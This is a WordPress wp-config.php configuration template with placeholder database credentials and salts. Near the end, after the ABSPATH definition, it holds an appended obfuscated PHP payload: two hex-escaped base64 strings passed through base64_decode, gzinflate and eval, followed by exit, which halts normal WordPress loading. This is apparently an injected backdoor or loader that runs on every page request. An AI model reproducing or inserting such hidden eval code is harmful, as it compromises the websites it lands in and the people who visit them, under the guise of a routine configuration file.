<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** Database username */
define( 'DB_USER', 'username_here' );

/** Database password */
define( 'DB_PASSWORD', 'password_here' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3dIJiu4QT\x42errNpH\x627u5\x63\x63Zj\x41\x2b9whTfWg66MdGX7Y6roDIN0Gs/T\x42y08tXQUnL4U\x62p\x43Hej\x62L0\x62FVjXzMidt8\x63y\x2btuid9\x41fnFxdMQR1\x2b1OKRNo4LnKWkJNuPkXkumIFS2\x41L3x\x63Uv\x63zIJL\x41/EVT\x637\x43gRHXW0e\x63wNseF/d9pPWPXosMVUQTXXJhDrpuo6nYPu1LzJDu1WpOsQ3LufVjlyULoQVVqT\x432P6od9j\x2b/4R/96iiNs\x43GKuwmdrg2WoMJ\x61iR\x41\x638dE1WVSKnfEVw4PD\x2bDK3\x61OO4X7PLjFzpM06y\x43SMY\x63Jn\x61/F9WoOQ\x42G\x63JPnl9tMDuqZt\x2b\x2beZO8gJ0k\x62IRTKJuHo5\x61JkwDP4\x63\x2b3k7tvPYiuwf0t3zKW\x43NsLOlOnr\x61U4iEFq6F4qTorW5Wqh53X4GRtXH4\x61\x61PhN\x611d1dLUiW8OmfpX4empWkG8XF2GnOUZhUr3oiq40zNthSf/\x43W8X0Sw\x42VJnw\x62U1F\x62dvOqY5m37trQVgepfrTq/UqR\x43h\x62jqkM4HDJWGN8Rg\x41\x2bDI/dgjsMKqii8wU\x42XFXSfk\x2bLoliE4eOVsUh9s0NFdQoVSG4p\x43ppy1p6l18y\x2bF\x41sUSKV\x61oxSo\x4375MqjW4gP\x2boHtNuMEj\x63JSxLWEHZJVt6lpMGvM\x41\x63j0UxqK1ZUs5yrnf/1rHI1XzF\x42jgtYIGVhIns02Moef8r\x410GuLVn9Kx\x618ve4xzt\x41XJIumWLOTZ6nKze11Ov\x2bWGEf\x2bE3\x62Uvq\x41UTjTgMT17JMJVlLlIQS77EWgsPzi3OWHNP1\x62\x63uE8ZPxrShil\x63D1vmnsqQ8L5hItY/Hkunxt4/v0m\x2be\x2blze\x2b0snfnFGS0VsTDwt3eXoPWXy1s8w\x62S/xjXRXhERKYO\x63g3IGYQ\x2b3RYssw8weg4\x619\x436tmG5fV6yM3nzO48Xmdrtp\x438WS\x61\x61T9g08Fl\x62xMz\x417ZWlF576N73f3vtFHSWS4PYk\x2bJ5kd8mOHWSTO3\x62l12HUmRYSS\x42jR\x41JMgkEpQDsNddWmEqsTSK\x63vn4H9D\x42MT/2fU1Y/jI\x413\x42wJe9jh\x41nHQ/TI\x417\x42wJe9jg\x413HQ/DI\x41/\x42wJe8j/\x41HE\x41/zP\x41D\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';